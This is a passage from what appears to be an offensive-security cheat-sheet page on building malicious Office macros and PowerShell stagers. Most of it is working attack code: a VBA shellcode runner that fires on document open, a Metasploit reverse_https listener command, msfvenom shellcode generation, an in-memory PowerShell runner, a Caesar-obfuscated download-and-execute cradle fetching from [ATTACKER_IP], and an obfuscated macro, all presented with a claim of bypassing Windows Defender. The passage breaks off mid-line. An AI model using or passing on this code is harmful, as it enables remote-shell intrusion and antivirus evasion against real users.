style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">145</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token range operator" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">85</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">215</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">For</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token return-type class-name">To</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">buf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">buf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Next </span><span class="token class-name">i</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    addr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">H3000</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">H40</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">For</span><span class="token plain"> counter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">LBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token return-type class-name">To</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">UBound</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">buf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">counter</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    res </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">RtlMoveMemory</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addr </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> counter</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Next </span><span class="token class-name">counter</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    res </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Document_Open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MyMacro</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AutoOpen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MyMacro</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Start your Metasploit listener</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> msfconsole </span><span class="token parameter variable" style="color:#36acaa">-q</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-x</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost [ATTACKER_IP]; set lport [PORT]; exploit&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Deliver your Macros</strong> and wait for execution and your reverse shell</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="powershell-stager---encrypted--obfuscated"><strong>PowerShell Stager - Encrypted &amp; Obfuscated</strong><a href="#powershell-stager---encrypted--obfuscated" class="hash-link" aria-label="Direct link to powershell-stager---encrypted--obfuscated" title="Direct link to powershell-stager---encrypted--obfuscated" translate="no">​</a></h3>
<p><strong>IMPORTANT: it was tested in lab machine and successfully bypass Windows Defender, but if AMSI protection is enabled then it could not work</strong></p>
<ol>
<li class=""><strong>Create your Shellcode</strong></li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># If something is not working consider using 32-bits payloads (windows/meterpreter/reverse_http)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/meterpreter/reverse_https </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">LHOST</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">LPORT</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">EXITFUNC</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">thread </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Create your PowerShell script</strong>, inset here your shellcode and save the file as <code>run.ps1</code>, this is supposed to be loaded directly in memory, therefore not touching the disk and avoiding AV scanning</li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token variable" style="color:#36acaa">$Kernel32</span><span class="token plain"> = @</span><span class="token string" style="color:#e3116c">&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">using System;</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">using System.Runtime.InteropServices;</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">public class Kernel32 {</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    [DllImport(&quot;</span><span class="token plain">kernel32</span><span class="token string" style="color:#e3116c">&quot;)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        uint flAllocationType, uint flProtect);</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    [DllImport(&quot;</span><span class="token plain">kernel32</span><span class="token string" style="color:#e3116c">&quot;, CharSet=CharSet.Ansi)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">            uint dwCreationFlags, IntPtr lpThreadId);</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c"></span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    [DllImport(&quot;</span><span class="token plain">kernel32</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dll</span><span class="token string" style="color:#e3116c">&quot;, SetLastError=true)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">    public static extern UInt32 WaitForSingleObject(IntPtr hHandle,</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">        UInt32 dwMilliseconds);</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain">@</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Add-Type</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$Kernel32</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># INSERT SHELLCODE HERE</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token namespace" style="opacity:0.7">[Byte[]]</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$buf</span><span class="token plain"> = 0xfc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0x83</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0x41</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0x89</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0xda</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0xff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$size</span><span class="token plain"> = </span><span class="token variable" style="color:#36acaa">$buf</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token namespace" style="opacity:0.7">[IntPtr]</span><span class="token variable" style="color:#36acaa">$addr</span><span class="token plain"> = </span><span class="token namespace" style="opacity:0.7">[Kernel32]</span><span class="token plain">::VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token variable" style="color:#36acaa">$size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0x3000</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0x40</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token namespace" style="opacity:0.7">[System.Runtime.InteropServices.Marshal]</span><span class="token plain">::</span><span class="token function" style="color:#d73a49">Copy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> 0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$size</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$thandle</span><span class="token plain">=</span><span class="token namespace" style="opacity:0.7">[Kernel32]</span><span class="token plain">::CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token variable" style="color:#36acaa">$addr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token namespace" style="opacity:0.7">[Kernel32]</span><span class="token plain">::WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$thandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">[uint32]</span><span class="token string" style="color:#e3116c">&quot;0xFFFFFFFF&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Encrypt your PS Code</strong>, this scipt will transform the characters to their ASCII value and do a Caesar encryption</li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token variable" style="color:#36acaa">$payload</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">&quot;powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring(&#x27;http://[ATTACKER_IP]/[stager_filename].txt&#x27;))&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token namespace" style="opacity:0.7">[string]</span><span class="token variable" style="color:#36acaa">$output</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$payload</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ToCharArray</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token namespace" style="opacity:0.7">[string]</span><span class="token variable" style="color:#36acaa">$thischar</span><span class="token plain"> = </span><span class="token namespace" style="opacity:0.7">[byte]</span><span class="token namespace" style="opacity:0.7">[char]</span><span class="token variable" style="color:#36acaa">$_</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> 17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$thischar</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length </span><span class="token operator" style="color:#393A34">-eq</span><span class="token plain"> 1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$thischar</span><span class="token plain"> = </span><span class="token namespace" style="opacity:0.7">[string]</span><span class="token string" style="color:#e3116c">&quot;00&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$thischar</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$output</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$thischar</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">elseif</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$thischar</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length </span><span class="token operator" style="color:#393A34">-eq</span><span class="token plain"> 2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$thischar</span><span class="token plain"> = </span><span class="token namespace" style="opacity:0.7">[string]</span><span class="token string" style="color:#e3116c">&quot;0&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$thischar</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$output</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$thischar</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">elseif</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$thischar</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length </span><span class="token operator" style="color:#393A34">-eq</span><span class="token plain"> 3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$output</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$thischar</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$output</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain"> clip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$output</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ol>
<li class=""><strong>Create your Macros</strong>, copy the contents from above step to the payload part and save the file as a <code>.docm</code></li>
</ol>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token return-type class-name">Function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Pears</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Beets</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Pears </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Beets </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">17</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Strawberries</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Grapes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Strawberries </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Left</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Grapes</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Almonds</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Jelly</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Almonds </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Right</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Jelly</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Jelly</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Nuts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Milk</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">Do</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Oatmilk </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Oatmilk </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Pears</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Strawberries</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Milk</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Milk </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Almonds</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Milk</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Loop </span><span class="token return-type class-name">While</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Milk</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Nuts </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Oatmilk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">MyMacro</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim Apples As String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim Water As String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// Payload resulting from previous step</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Apples </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;1291281361042112211.............640633137133056058058&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Water </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Nuts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Apples</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">GetObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">Nuts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;136122127126120126133132075&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span 